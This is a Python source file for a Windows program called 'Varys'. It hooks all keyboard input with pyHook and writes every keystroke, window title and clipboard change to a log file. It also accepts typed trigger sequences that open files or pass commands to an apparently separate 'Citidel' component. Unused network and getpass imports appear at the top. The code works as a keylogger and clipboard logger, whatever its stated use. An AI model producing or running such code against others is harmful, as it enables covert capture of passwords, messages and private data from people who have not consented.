import pyHook, pythoncom, sys, logging,os, pyperclip, httplib, urllib, getpass, shutil, pickle
from datetime import datetime
import threading
from random import randint

class Varys:

    def __init__(self):
        self.__file_log = datetime.now().strftime('%y%m%w%d')+".txt"
        x=open("datadict.p","rb")
        self.__grph = pickle.load(x)
        x.close()
        self.__take_cmd=0
        self.__cmd=''
        self.__line_buff=""
        self.__window_buff=""
        self.__filecheck=False
        self.__filename=""
        self.__conf=False
        self.__sub=[]
        self.__previouscopy=""
        hooks_manager = pyHook.HookManager()
        hooks_manager.KeyDown = self.OnKeyboardEvent
        hooks_manager.HookKeyboard()
        pythoncom.PumpMessages()

    def getWindowName(self):
        return self.__window_buff

    def OnKeyboardEvent(self,event):

        logging.basicConfig(filename=self.__file_log, level=logging.DEBUG, format='%(message)s')
        ky=event.Ascii

        if(not event.WindowName == self.__window_buff and not event.WindowName==None):
            self.__window_buff=event.WindowName
            self.__line_buff+="\n"
            self.__line_buff+=datetime.now().strftime('%X')+"\t"
            self.__line_buff+=event.WindowName
            self.__line_buff+="\n"
            logging.log(10,self.__line_buff)
            self.__line_buff=""


    #### Check if user needs file/folder opened

        if(len(self.__line_buff)>3):
            if((self.__line_buff[-1]+self.__line_buff[-2]+self.__line_buff[-3]+self.__line_buff[-4])==">>>>"):
                self.__filecheck=True


    #### Deal with limited conflicts in self.__filename

        if(self.__conf):
            os.system("taskkill /im notepad.exe")
            if(ky>47 and ky<58):
                os.startfile(self.__sub[int(chr(ky))]+"\\"+self.__filename)
            self.__filename=""
            self.__conf=False

        if((not (pyperclip.paste() == self.__previouscopy)) and (pyperclip.paste() != "")):
            self.__previouscopy=pyperclip.paste()
            self.__line_buff+="[Copied data: "+pyperclip.paste()+"]"


    #### Check if file/folder name exists and open

        if(self.__filecheck):
            if(ky > 31 and ky < 127):
                if(not chr(ky)=="<"):
                    self.__filename += chr(ky).lower()
                else:
                    try:
                        self.__sub=self.__grph[self.__filename]
                    except:
                        self.__sub=[]
                    if(len(self.__sub)==1):
                        os.startfile(self.__sub[0]+"\\"+self.__filename)
                        self.__filename=""
                    elif(len(self.__sub)<=10 and len(self.__sub)>1):
                        txt="Enter Numbered FilePath to Open\n\n"
                        f=open("Conflicts.txt","w")
                        for i in range(len(self.__sub)):
                            txt+=str(i)+"- "+self.__sub[i]+"\\"+self.__filename+"\n"
                        f.write(txt)
                        f.close()
                        os.startfile("Conflicts.txt")
                        os.startfile("Conflicts.txt")
                        self.__conf=True
                    else:
                        self.__filename=""
                    self.__filecheck=False

    #### Update linebuff with event

        if(ky > 31 and ky < 127):
            self.__line_buff += chr(ky)
##        TODO might have bug in taking first cmd
            if(self.__take_cmd):
                self.__cmd+=chr(ky)
                if(chr(ky)=='<'):
                    try:
                        f=open((os.path.join(os.getcwd(),'..','Citidel','Temp.txt')),"w")
                        f.write(str(randint(10000,99999))+self.__cmd[:-1])
                        f.close()
                    except:
                        pass
                    self.__cmd=""
                    self.__take_cmd=0
            if(chr(ky)=='@'):
                self.__take_cmd=1

            return True

        if(ky == 13):
            self.__line_buff+="\n"
            return True


        if(event.Ascii == 8):
            self.__line_buff = self.__line_buff[:-1]
            return True

        return True

if __name__ == "__main__":
    v=Varys()
